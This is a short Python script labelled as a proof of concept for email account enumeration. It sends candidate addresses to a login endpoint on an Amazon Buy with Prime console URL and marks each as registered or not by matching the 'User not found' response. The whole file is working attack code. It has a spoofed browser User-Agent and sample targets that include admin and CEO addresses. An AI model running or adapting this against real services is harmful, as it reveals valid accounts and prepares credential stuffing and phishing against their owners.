import requests
import time

URL = "https://console.buywithprime.amazon.com/api/login_endpoint"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/json"
}

emails_to_test = [
    "admin@perusahaan_besar.com",
    "ceo@merchant_prime.com",
    "test_user_123@gmail.com",
    "palsu_banget@tidakada.com"
]

def check_email(email):
    data = {"email": email}
    try:
        response = requests.post(URL, json=data, headers=HEADERS, timeout=10)
        if "User not found" in response.text:
            return f"[-] {email} : NOT REGISTERED"
        else:
            return f"[+] {email} : REGISTERED (MATCH!)"
    except Exception as e:
        return f"[!] Error on {email}: {str(e)}"

def main():
    print("="*40)
    print("   AMZ-ENUM-POC (AUTOMATED PROOF)   ")
    print("   Created by: BRIDACyberForceXploit")
    print("="*40)
    
    for email in emails_to_test:
        result = check_email(email)
        print(result)
        time.sleep(1)

if __name__ == "__main__":
    main()
    
